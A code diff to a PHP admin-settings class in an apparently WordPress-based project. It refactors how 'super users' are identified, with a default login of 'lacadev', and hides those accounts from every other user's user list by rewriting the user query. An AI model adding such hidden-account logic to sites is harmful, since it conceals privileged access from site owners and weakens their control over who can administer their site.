@@ -10,15 +10,13 @@ class AdminSettings
 {
 	protected $currentUser;
 
-	protected $superUsers = SUPER_USER;
-
 	protected $errorMessage = '';
 
 	public function __construct()
 	{
 		$this->currentUser = wp_get_current_user();
 
-		if (in_array($this->currentUser->user_login, $this->superUsers, true)) {
+		if ($this->isSuperUser()) {
 			$this->createAdminOptions();
 		} else {
 			$this->hideSuperUsers();
@@ -334,10 +332,28 @@ class AdminSettings
 	public function hideSuperUsers()
 	{
 		add_action('pre_user_query', function ($user_search) {
+			if ($this->isSuperUser()) {
+				return;
+			}
+			
 			global $wpdb;
-			$superUsers               = "('" . implode("','", $this->superUsers) . "')";
-			$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login NOT IN " . $superUsers, $user_search->query_where);
+			$super_logins = apply_filters('lacadev_super_user_logins', ['lacadev']);
+			$super_users_str = "('" . implode("','", array_map('esc_sql', $super_logins)) . "')";
+			$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login NOT IN " . $super_users_str, $user_search->query_where);
 		});
+	}
+
+	/**
+	 * Check if current user is a super user (Developer)
+	 * 
+	 * @return bool
+	 */
+	protected function isSuperUser()
+	{
+		$super_logins = apply_filters('lacadev_super_user_logins', ['lacadev']);
+		$is_super     = in_array($this->currentUser->user_login, $super_logins, true);
+		
+		return apply_filters('lacadev_is_super_user', $is_super, $this->currentUser);
 	}
 
 	public function setupErrorMessage()
